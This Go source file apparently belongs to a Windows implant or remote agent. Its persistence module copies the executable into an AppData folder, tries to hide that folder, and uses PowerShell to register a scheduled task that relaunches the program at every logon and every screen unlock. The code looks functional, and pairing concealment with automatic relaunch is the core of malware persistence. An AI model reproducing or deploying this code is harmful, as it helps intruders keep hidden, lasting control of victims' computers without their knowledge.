//go:build windows && persist_eventtask
// +build windows,persist_eventtask

package persistence

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func init() {
	persistInstallFns = append(persistInstallFns, installEventTask)
	persistUninstallFns = append(persistUninstallFns, uninstallEventTask)
}

func installEventTask(exePath string) error {
	targetPath, err := getAppDataTargetPath()
	if err != nil {
		return err
	}
	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("eventtask: failed to create dir: %w", err)
	}
	tryHideDirectory(dir)
	if !strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
		if err := replaceExecutable(exePath, targetPath); err != nil {
			return err
		}
	}

	taskName := deriveTaskName(targetPath) + "_ev"
	safe := strings.ReplaceAll(targetPath, "'", "''")

	// Two triggers: session unlock (event 4801) + logon (event 4624)
	// This makes the agent restart not just at boot but also when user unlocks screen
	script := fmt.Sprintf(`
$action = New-ScheduledTaskAction -Execute '%s'

$triggerLogon = New-ScheduledTaskTrigger -AtLogOn

$cimTriggerClass = Get-CimClass -Namespace 'Root\Microsoft\Windows\TaskScheduler' -ClassName 'MSFT_TaskEventTrigger' -ErrorAction SilentlyContinue
$triggerUnlock = $null
if ($cimTriggerClass) {
    $triggerUnlock = New-CimInstance -CimClass $cimTriggerClass -ClientOnly
    $triggerUnlock.Subscription = '<QueryList><Query Id="0" Path="Security"><Select Path="Security">*[System[EventID=4801]]</Select></Query></QueryList>'
    $triggerUnlock.Enabled = $true
}

$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable -MultipleInstances IgnoreNew
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited -LogonType InteractiveToken

if ($triggerUnlock) {
    Register-ScheduledTask -TaskName '%s' -Action $action -Trigger @($triggerLogon, $triggerUnlock) -Settings $settings -Principal $principal -Force | Out-Null
} else {
    Register-ScheduledTask -TaskName '%s' -Action $action -Trigger $triggerLogon -Settings $settings -Principal $principal -Force | Out-Null
}`, safe, taskName, taskName)

	return runPowerShell(script)
}

func uninstallEventTask() error {
	prefix := executablePrefix()
	return runPowerShell(
		`Get-ScheduledTask -ErrorAction SilentlyContinue | ` +
			`Where-Object { $_.TaskName -like '` + prefix + `*_ev' } | ` +
			`Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue`)
}
